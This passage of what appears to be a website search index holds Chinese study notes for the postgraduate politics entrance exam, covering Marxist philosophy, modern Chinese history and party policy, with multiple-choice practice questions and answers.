\u6709\u7ed3\u5408\u7684\u57fa\u56e0 \u3010\u5355\u9009\u3011\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316\u5386\u53f2\u8fc7\u7a0b\u4ea7\u751f\u4e86\u6bdb\u6cfd\u4e1c\u601d\u60f3\u548c\u4e2d\u56fd\u7279\u8272 \u793e\u4f1a\u4e3b\u4e49\u7406\u8bba\u4f53\u7cfb\u3002\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u7406\u8bba\u4f53\u7cfb\u7684\u5f00\u521b\u4e4b\u4f5c\u662f A.\u6bdb\u6cfd\u4e1c\u601d\u60f3 B.\u9093\u5c0f\u5e73\u7406\u8bba C.\u4e09\u4e2a\u4ee3\u8868\u201c\u91cd\u8981\u601d\u60f3\u548c\u79d1\u5b66\u53d1\u5c55\u89c2 D.\u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3 \u7b54\u6848 $$ B $$ \u3010\u591a\u9009\u3011\u4e2d\u56fd\u9769\u547d\u3001\u5efa\u8bbe\u548c\u6539\u9769\u7684\u5b9e\u8df5\u8bc1\u660e,\u8981\u8fd0\u7528\u9a6c\u514b\u601d\u4e3b\u4e49\u6307 \u5bfc\u5b9e\u8df5,\u5fc5\u987b\u5b9e\u73b0\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316,\u9a6c\u514b\u601d\u4e3b\u4e49\u4e4b\u6240\u4ee5\u80fd\u591f\u4e2d\u56fd\u5316 \u7684\u539f\u56e0\u5728\u4e8e A.\u9a6c\u514b\u601d\u4e3b\u4e49\u7406\u8bba\u7684\u5185\u5728\u8981\u6c42 B.\u9a6c\u514b\u601d\u4e3b\u4e49\u4e0e\u4e2d\u534e\u6c11\u65cf\u4f18\u79c0\u6587\u5316\u5177\u6709\u76f8\u878d\u6027 C.\u4e2d\u56fd\u9769\u547d\u3001\u5efa\u8bbe\u548c\u6539\u9769\u7684\u5b9e\u8df5\u9700\u8981\u9a6c\u514b\u601d\u4e3b\u4e49\u6307\u5bfc D.\u9a6c\u514b\u601d\u4e3b\u4e49\u4e3a\u4e2d\u56fd\u9769\u547d\u3001\u5efa\u8bbe\u548c\u6539\u9769\u63d0\u4f9b\u4e86\u73b0\u5b9e\u7684\u53d1\u5c55\u6a21\u5f0f \u7b54\u6848 $$ ABC $$","title":"2.6. \u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#27","text":"\u521b\u65b0\u3001\u534f\u8c03\u3001\u7eff\u8272\u3001\u5f00\u653e\u3001\u5171\u4eab \u3010\u5355\u9009\u3011\u521b\u65b0\u3001\u534f\u8c03:\u7eff\u8272\u3001\u5f00\u653e\u3001\u5171\u4eab\u7684\u65b0\u53d1\u5c55\u7406\u5ff5,\u5404\u4e2a\u65b9\u9762\u7684\u4fa7\u91cd\u70b9\u90fd\u4e0d\u540c,\u5176\u4e2d \u5f00\u653e \u6ce8\u91cd\u7684\u662f A.\u89e3\u51b3\u793e\u4f1a\u7684\u516c\u5e73\u6b63\u4e49 B.\u89e3\u51b3\u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u95ee\u9898 C.\u89e3\u51b3\u53d1\u5c55\u7684\u52a8\u529b\u95ee\u9898 D.\u89e3\u51b3\u53d1\u5c55\u5185\u5916\u8054\u52a8\u95ee\u9898 \u7b54\u6848 $$ D $$ \u3010\u5355\u9009\u3011\u521b\u65b0\u3001\u534f\u8c03\u3001\u7eff\u8272\u3001\u5f00\u653e\u3001\u5171\u4eab\u7684\u65b0\u53d1\u5c55\u7406\u5ff5,\u5404\u4e2a\u65b9\u9762\u7684\u4fa7\u91cd\u70b9\u90fd\u4e0d\u540c,\u5176\u4e2d \u534f\u8c03 \u6ce8\u91cd\u7684\u662f A.\u89e3\u51b3\u793e\u4f1a\u7684\u516c\u5e73\u6b63\u4e49 B.\u89e3\u51b3\u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u95ee\u9898 C.\u89e3\u51b3\u53d1\u5c55\u7684\u52a8\u529b\u95ee\u9898 D.\u89e3\u51b3\u53d1\u5c55\u5185\u5916\u8054\u52a8\u95ee\u9898 \u7b54\u6848 $$ B $$","title":"2.7. \u4e94\u5927\u53d1\u5c55\u7406\u5ff5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#3","text":"","title":"3. \u7b2c\u4e09\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#31","text":"\u4f9d\u6cd5\u6cbb\u56fd\u662f\u6211\u4eec\u6cbb\u56fd\u7406\u653f\u7684\u57fa\u672c\u65b9\u5f0f\uff0c\u5177\u6709\u7edf\u4e00\u6027\uff0c\u4ee5\u56fd\u5bb6\u7684\u5f3a\u5236\u529b\u4e3a\u540e\u76fe\uff1b \u4ee5\u5fb7\u6cbb\u56fd\u662f\u6211\u4eec\u6cbb\u56fd\u7406\u653f\u7684\u91cd\u8981\u65b9\u5f0f\uff0c\u5bf9\u4e0d\u540c\u7684\u4eba\u5177\u6709\u4e0d\u4e00\u6837\u7684\u6807\u51c6\uff0c\u662f\u4ee5\u4eba\u4eec\u7684\u8206\u8bba\u548c\u6559\u5316\u4e3a\u540e\u76fe\u3002","title":"3.1. \u4f9d\u6cd5\u6cbb\u56fd\u3001\u4ee5\u5fb7\u6cbb\u56fd"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#32","text":"\u54f2\u5b66\u7684\u57fa\u672c\u95ee\u9898\u5c31\u662f\u7814\u7a76\u7269\u8d28\u548c\u610f\u8bc6\u7684\u7b2c\u4e00\u6027\u548c\u540c\u4e00\u6027\u7684\u5173\u7cfb\u3002","title":"3.2. \u552f\u7269\u4e3b\u4e49\u548c\u552f\u5fc3\u4e3b\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#33","text":"\u4e3b\u8981\u77db\u76fe\uff1a\u5e1d\u56fd\u4e3b\u4e49\u548c\u4e2d\u534e\u6c11\u65cf\u7684\u77db\u76fe\uff1b\u5c01\u5efa\u4e3b\u4e49\u540c\u4eba\u6c11\u5927\u4f17\u7684\u77db\u76fe \u4e3b\u8981\u4efb\u52a1\uff1a\u6c11\u65cf\u72ec\u7acb\u3001\u4eba\u6c11\u89e3\u653e\uff1b\u56fd\u5bb6\u5bcc\u5f3a\u3001\u4eba\u6c11\u5bcc\u88d5","title":"3.3. \u8fd1\u4ee3\u4e2d\u56fd\u7684\u4e3b\u8981\u77db\u76fe\u548c\u4e3b\u8981\u4efb\u52a1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#34","text":"\u5b9e\u8df5\u662f\u8ba4\u8bc6\u7684\u57fa\u7840\uff1b \u5b9e\u8df5\u662f\u8ba4\u8bc6\u7684\u76ee\u7684\uff1b \u5b9e\u8df5\u662f\u8ba4\u8bc6\u53d1\u5c55\u7684\u52a8\u529b\uff1b","title":"3.4. \u5b9e\u8df5\u548c\u8ba4\u8bc6\u7684\u5173\u7cfb"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#35","text":"\u804c\u4e1a\u9053\u5fb7 \uff1a\u7231\u5c97\u656c\u4e1a\u3001\u8bda\u5b9e\u5b88\u4fe1\u3001\u529e\u4e8b\u516c\u9053\u3001\u670d\u52a1\u7fa4\u4f17\u3001\u5949\u732e\u793e\u4f1a \u516c\u5171\u9053\u5fb7 \uff1a\u6587\u660e\u793c\u8c8c\u3001\u52a9\u4eba\u4e3a\u4e50\u3001\u7231\u62a4\u516c\u7269\u3001\u4fdd\u62a4\u73af\u5883\u3001 \u9075\u7eaa\u5b88\u6cd5 \u9075\u7eaa\u5b88\u6cd5\uff1a\u6700\u57fa\u672c\u8981\u6c42 \u5949\u732e\u793e\u4f1a\uff1a\u6700\u9ad8\u8981\u6c42","title":"3.5. \u804c\u4e1a\u9053\u5fb7\u548c\u516c\u5171\u9053\u5fb7"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#36","text":"\u2460 \u4ee5\u7231\u56fd\u4e3b\u4e49\u4e3a\u6838\u5fc3\u7684\u6c11\u65cf\u7cbe\u795e \u56db\u4e2a\u65b9\u9762\uff1a \u521b\u9020\u7cbe\u795e \u56e2\u7ed3\u7cbe\u795e \u594b\u6597\u7cbe\u795e \u68a6\u60f3\u7cbe\u795e \u2461 \u4ee5\u6539\u9769\u521b\u65b0\u4e3a\u6838\u5fc3\u7684\u65f6\u4ee3\u7cbe\u795e \u3010\u5355\u9009\u3011\u76d8\u53e4\u5f00\u5929\uff0c\u5973\u5a32\u8865\u5929\uff0c\u4f0f\u7fb2\u753b\u5366\uff0c\u795e\u519c\u5c1d\u8349\uff0c\u5938\u7236\u8ffd\u65e5\uff0c\u7cbe\u536b\u586b\u6d77\uff0c\u611a\u516c\u79fb\u5c71\u7b49\u6211\u56fd\u53e4\u4ee3\u795e\u8bdd\u6df1\u523b\u53cd\u6620\u4e86\u4e2d\u56fd\u4eba\u6c11\u5177\u6709\uff08 \uff09 A.\u4f1f\u5927\u7684\u594b\u6597\u7cbe\u795e B.\u4f1f\u5927\u7684\u521b\u9020\u7cbe\u795e C.\u4f1f\u5927\u7684\u56e2\u7ed3\u7cbe\u795e D.\u4f1f\u5927\u7684\u68a6\u60f3\u7cbe\u795e \u7b54\u6848 $$ D $$","title":"3.6. \u4e2d\u56fd\u7cbe\u795e"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#37","text":"\u4e09\u6c11\u4e3b\u4e49\uff1a\u6c11\u65cf\u3001\u6c11\u6743\u3001\u6c11\u751f\uff08\u4e2d\u56fd\u540c\u76df\u4f1a\u7eb2\u9886\uff09 \u4e09\u4e2a\u9769\u547d\uff1a \u6c11\u65cf\u4e3b\u4e49\u5bf9\u5e94\u6c11\u65cf\u9769\u547d\uff1b \u5185\u5bb9\uff1a\u9a71\u9010\u9791\u864f\uff0c\u6062\u590d\u4e2d\u534e \u5c40\u9650\uff1a\u9791\u864f\u6307\u6ee1\u6e05\u653f\u5e9c\uff0c\u6ca1\u6709\u53cd\u5bf9\u5e1d\u56fd\u4e3b\u4e49\uff0c\u53cd\u5c01\u5efa\u4e5f\u4e0d\u5f7b\u5e95 \u6c11\u6743\u4e3b\u4e49\u5bf9\u5e94\u653f\u6cbb\u9769\u547d\uff1b \u5185\u5bb9\uff1a\u521b\u7acb\u6c11\u56fd \u5c40\u9650\uff1a\u4ee3\u8868\u8d44\u4ea7\u9636\u7ea7\u5229\u76ca\uff0c\u6ca1\u6709\u4ee3\u8868\u6700\u5e7f\u5927\u7684\u4eba\u6c11\u5229\u76ca \u6c11\u751f\u4e3b\u4e49\u5bf9\u5e94\u793e\u4f1a\u9769\u547d\u3002 \u5185\u5bb9\uff1a\u5e73\u5747\u5730\u6743 \u5c40\u9650\uff1a\u6ca1\u6709\u771f\u6b63\u5730\u5206\u571f\u5730\uff0c\u65e0\u6cd5\u6210\u4e3a\u53d1\u52a8\u52b3\u52a8\u4eba\u6c11\u7684\u6b66\u5668 \u3010\u591a\u9009\u3011\u5728\u5b59\u4e2d\u5c71\u7684\u4e09\u6c11\u4e3b\u4e49\u4e2d\uff0c\u6c11\u751f\u4e3b\u4e49\u6307\u7684\u5c31\u662f\"\u5e73\u5747\u5730\u6743\"\uff0c\u4e5f\u5c31\u662f\u5b59\u4e2d\u5c71\u6240\u8bf4\u7684\u793e\u4f1a\u9769\u547d\uff0c\u5b59\u4e2d\u5c71\u7684\u6c11\u751f\u4e3b\u4e49\u7684\u5c40\u9650\u6027\u5728\u4e8e\uff08 \uff09 A.\"\u5e73\u5747\u5730\u6743\"\u7684\u4e3b\u5f20\u5e76\u975e\u5c06\u571f\u5730\u6240\u6709\u6743\u5206\u7ed9\u519c\u6c11 B.\u6ca1\u6709\u6b63\u9762\u89e6\u53ca\u5c01\u5efa\u571f\u5730\u6240\u6709\u5236 C.\u6ca1\u6709\u4ece\u6b63\u9762\u9c9c\u660e\u7684\u63d0\u51fa\u53cd\u5bf9\u5e1d\u56fd\u4e3b\u4e49\u7684\u7eb2\u9886 D.\u5728\u9769\u547d\u4e2d\u96be\u4ee5\u6210\u4e3a\u53d1\u52a8\u5e7f\u5927\u5de5\u519c\u7fa4\u4f17\u7684\u7406\u8bba\u6b66\u5668 \u7b54\u6848 $$ ABD $$","title":"3.7. \u8f9b\u4ea5\u9769\u547d"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#38","text":"\u793e\u4f1a\u5b58\u5728\u51b3\u5b9a\u793e\u4f1a\u610f\u8bc6\uff0c\u793e\u4f1a\u610f\u8bc6\u5bf9\u793e\u4f1a\u5b58\u5728\u5177\u6709\u76f8\u5bf9\u72ec\u7acb\u6027\u3002 \u76f8\u5bf9\u72ec\u7acb\u6027\u8868\u73b0\u5728\u4e09\u4e2a\u65b9\u9762\uff1a \u2460 \u793e\u4f1a\u610f\u8bc6\u548c\u793e\u4f1a\u5b58\u5728\u5177\u6709\u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u6027 \u2461 \u793e\u4f1a\u610f\u8bc6\u548c\u793e\u4f1a\u5b58\u5728\u5177\u6709\u793e\u4f1a\u5386\u53f2\u6027 \u2462 \u793e\u4f1a\u610f\u8bc6\u548c\u793e\u4f1a\u5b58\u5728\u5177\u6709\u80fd\u52a8\u53cd\u4f5c\u7528 \u793e\u4f1a\u5b58\u5728\u5305\u542b\u4e09\u4e2a\u65b9\u9762\u7684\u5185\u5bb9\uff1a \u7269\u8d28\u751f\u4ea7\u65b9\u5f0f\uff1b\u81ea\u7136\u5730\u7406\u73af\u5883\uff1b\u4eba\u53e3\u56e0\u7d20 \u3010\u5355\u9009\u3011\u793e\u4f1a\u5b58\u5728\u51b3\u5b9a\u793e\u4f1a\u610f\u8bc6,\u793e\u4f1a\u610f\u8bc6\u662f\u793e\u4f1a\u5b58\u5728\u7684\u53cd\u4f5c\u7528\u3002\u793e\u4f1a\u610f\u8bc6\u5177\u6709\u76f8\u5bf9\u72ec\u7acb\u6027,\u5373\u5b83\u5728\u53cd\u6620\u793e\u4f1a\u5b58\u5728\u7684\u540c\u65f6,\u8fd8\u6709\u81ea\u5df1\u7279\u6709\u7684\u53d1\u5c55\u5f62\u5f0f\u548c\u89c4\u5f8b\u3002\u793e\u4f1a\u610f\u8bc6\u76f8\u5bf9\u72ec\u7acb\u6027\u6700\u7a81\u51fa\u7684\u8868\u73b0\u662f A.\u793e\u4f1a\u610f\u8bc6\u4e0e\u793e\u4f1a\u5b58\u5728\u53d1\u5c55\u7684\u4e0d\u5b8c\u5168\u540c\u6b65\u6027 B.\u793e\u4f1a\u610f\u8bc6\u5185\u90e8\u5404\u79cd\u5f62\u5f0f\u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u548c\u5f71\u54cd C.\u793e\u4f1a\u610f\u8bc6\u5404\u79cd\u5f62\u5f0f\u5404\u81ea\u6709\u5176\u5386\u53f2\u7ee7\u627f\u6027 D.\u793e\u4f1a\u610f\u8bc6\u5bf9\u793e\u4f1a\u5b58\u5728\u5177\u6709\u80fd\u52a8\u7684\u53cd\u4f5c\u7528 \u7b54\u6848 $$ D $$","title":"3.8. \u793e\u4f1a\u5b58\u5728\u548c\u793e\u4f1a\u610f\u8bc6"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#4","text":"","title":"4. \u7b2c\u56db\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#41","text":"\u2460 \u5de5\u4eba\u9636\u7ea7 \u2461 \u519c\u6c11\u9636\u7ea7 \u2462 \u5c0f\u8d44\u4ea7\u9636\u7ea7 \u2463 \u6c11\u65cf\u8d44\u4ea7\u9636\u7ea7 \u3010\u5355\u9009\u3011 \u4e2d\u56fd\u6ca6\u4e3a\u534a\u6b96\u6c11\u5730\u534a\u5c01\u5efa\u793e\u4f1a\u8fc7\u7a0b\u4e2d\uff0c\u6700\u65e9\u51fa\u73b0\u7684\u4e00\u4e2a\u65b0\u7684\u793e\u4f1a\u9636\u7ea7\u662f A.\u519c\u6c11\u9636\u7ea7 B.\u5c0f\u8d44\u4ea7\u9636\u7ea7 C.\u8d44\u4ea7\u9636\u7ea7 D.\u65e0\u4ea7\u9636\u7ea7 \u7b54\u6848 $$ D $$","title":"4.1. \u65b0\u6c11\u4e3b\u4e3b\u4e49\u793e\u4f1a\u7684\u9636\u7ea7\u6784\u6210"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#42","text":"\u4e24\u4e2a\u4e00\u767e\u5e74\uff1a \u7b2c\u4e00\u4e2a\u767e\u5e74\u662f\u5efa\u515a\uff081921\uff09\u4e00\u767e\u5468\u5e74\uff1b 2020\u5e74\u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a\u3002 \u7b2c\u4e8c\u4e2a\u767e\u5e74\u662f\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u6210\u7acb\uff081949\uff09\u4e00\u767e\u5468\u5e74\u3002 2050\u5efa\u6210\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316\u5f3a\u56fd\u3002 \u4e24\u6b65\u8d70\uff1a \u7b2c\u4e00\u6b65\uff1a\u4ece2020 \u5230 2035\uff0c\u57fa\u672c\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316\uff1b \u7b2c\u4e8c\u6b65\uff1a\u4ece2035 \u5230 2050\uff0c\u5efa\u6210\u73b0\u4ee3\u5316\u5f3a\u56fd\u3002 \u3010\u5355\u9009]\u7ecf\u8fc7\u957f\u671f\u52aa\u529b,\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u8fdb\u5165\u4e86\u65b0\u65f6\u4ee3\u3002\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u65b0\u65f6\u4ee3\u7684\u5fc5\u7136\u8981\u6c42\u548c\u5386\u53f2\u4efb\u52a1\u662f A.\u52302020\u5e74\u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a B.\u52302035\u5e74\u57fa\u672c\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316 C.\u5230\u4e2d\u56fd\u5171\u4ea7\u515a\u8bde\u751f100\u5e74\u57fa\u672c\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316 D.\u5230\u65b0\u4e2d\u56fd\u8bde\u751f100\u5e74\u5efa\u6210\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316\u5f3a\u56fd \u7b54\u6848 $$ D $$","title":"4.2. \u4e24\u4e2a\u4e00\u767e\u5e74\u548c\u4e24\u6b65\u8d70"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#43","text":"\u5b9e\u8df5\u7684\u6982\u5ff5\uff1a\u4eba\u7c7b\u80fd\u52a8\u6539\u9020\u4e16\u754c\u7684\u5ba2\u89c2\u7269\u8d28\u6027\u6d3b\u52a8\u3002 \u57fa\u672c\u7ed3\u6784\uff1a\u4e3b\u4f53\u3001\u4e2d\u4ecb\u3001\u5ba2\u4f53\u3002","title":"4.3. \u5b9e\u8df5\u7684\u6982\u5ff5\u548c\u57fa\u672c\u7ed3\u6784"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#44","text":"\u4e09\u4e2a\u57fa\u672c\u5b9e\u8df5\uff1a \u7269\u8d28\u751f\u4ea7\u5b9e\u8df5\uff1b \u793e\u4f1a\u653f\u6cbb\u5b9e\u8df5\uff1b \u79d1\u5b66\u6587\u5316\u5b9e\u9a8c \u65b0\u7684\u5b9e\u8df5\u5f62\u5f0f\uff1a \u865a\u62df\u5b9e\u8df5 \u3010\u591a\u9009\u3011\u8fa9\u8bc1\u552f\u7269\u4e3b\u4e49\u8ba4\u4e3a,\u5b9e\u8df5\u7684\u4e3b\u4f53\u548c\u5ba2\u4f53\u7684\u5173\u7cfb\u662f A.\u7b2c\u4e00\u6027\u548c\u7b2c\u4e8c\u6027\u7684\u5173\u7cfb B.\u6539\u9020\u548c\u88ab\u6539\u9020\u7684\u5173\u7cfb C.\u7406\u8bba\u6307\u5bfc\u5b9e\u8df5\u7684\u5173\u7cfb D.\u53cd\u6620\u548c\u88ab\u53cd\u6620\u7684\u5173\u7cfb \u7b54\u6848 $$ BD $$","title":"4.4. \u5b9e\u8df5\u7684\u57fa\u672c\u7c7b\u578b"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#45","text":"\u76f4\u63a5\u73b0\u5b9e\u6027\uff1a\u76f4\u63a5\u4ed8\u51fa\u884c\u52a8\uff0c\u5b9e\u8df5\u52a8\u624b\u624d\u662f\u5b9e\u8df5 \u4e3b\u89c2\u80fd\u52a8\u6027\uff1a\u5b9e\u8df5\u9700\u8981\u610f\u8bc6\u7684\u6307\u5bfc \u793e\u4f1a\u5386\u53f2\u6027\uff1a\u4eca\u5929\u7684\u5b9e\u8df5\u662f\u5728\u6211\u4eec\u8fc7\u53bb\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u5b9e\u8df5","title":"4.5. \u5b9e\u8df5\u7684\u57fa\u672c\u7279\u5f81"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#46","text":"\u771f\u7406\u662f\u4eba\u4eec\u5bf9\u5ba2\u89c2\u7269\u8d28\u4e16\u754c\u6b63\u786e\u7684\u8ba4\u8bc6\uff0c\u662f\u4e3b\u89c2\u548c\u5ba2\u89c2\u76f8\u7b26\u5408\u7684\u5185\u5bb9\uff1b \u4ef7\u503c\u662f\u5ba2\u89c2\u7269\u8d28\u5bf9\u4eba\u4eec\u9700\u8981\u7684\u6ee1\u8db3\u7a0b\u5ea6\u3002 \u3010\u591a\u9009\u3011\u57fa\u56e0\u7f16\u8f91\u662f\u5e94\u5bf9\u9057\u4f20\u6027\u75be\u75c5\u7684\u4e00\u79cd\u6f5c\u5728\u6cbb\u7597\u529e\u6cd5\uff0c\u4f46\u5176\u6280\u672f\u8fd0\u7528\u6781\u5177\u4e89\u8bae\uff0c\u8fd9\u4e0d\u4ec5\u662f\u56e0\u4e3a\u57fa\u56e0\u7684\u53d8\u5316\u4f1a\u4f20\u7ed9\u540e\u4ee3\u5e76\u6700\u7ec8\u6709\u53ef\u80fd\u5f71\u54cd\u6574\u4e2a\u57fa\u56e0\u5e93\uff0c\u800c\u4e14\u66f4\u91cd\u8981\u7684\u662f\u57fa\u56e0\u7f16\u8f91\u4f1a\u4ea7\u751f\u957f\u8fdc\u800c\u6df1\u523b\u7684\u793e\u4f1a\u5f71\u54cd\uff0c\u53ef\u80fd\u884d\u751f\u51fa\u4e00\u7cfb\u5217\u68d8\u624b\u7684\u4f26\u7406\u3001\u6cd5\u5f8b\u548c\u5b89\u5168\u96be\u9898\u3002\u6b63\u56e0\u5982\u6b64\uff0c\u8bb8\u591a\u56fd\u5bb6\u5bf9\u4eba\u7c7b\u57fa\u56e0\u7f16\u8f91\u6280\u672f\u5236\u5b9a\u4e86\u76f8\u5e94\u7684\u4f26\u7406\u3001\u6cd5\u5f8b\u89c4\u8303\u3002\u4eba\u7c7b\u4e25\u683c\u63a7\u5236\u57fa\u56e0\u7f16\u8f91\u884c\u4e3a\u7684\u539f\u56e0\u5728\u4e8e A.\u4eba\u7684\u5b9e\u8df5\u6d3b\u52a8\u8981\u9075\u5faa\u771f\u7406\u5c3a\u5ea6\u4e0e\u4ef7\u503c\u5c3a\u5ea6\u7684\u7edf\u4e00 B.\u57fa\u56e0\u7f16\u8f91\u6280\u672f\u53ef\u80fd\u7a81\u7834\u4eba\u7c7b\u7684\u4f26\u7406\u9053\u5fb7\u5e95\u7ebf 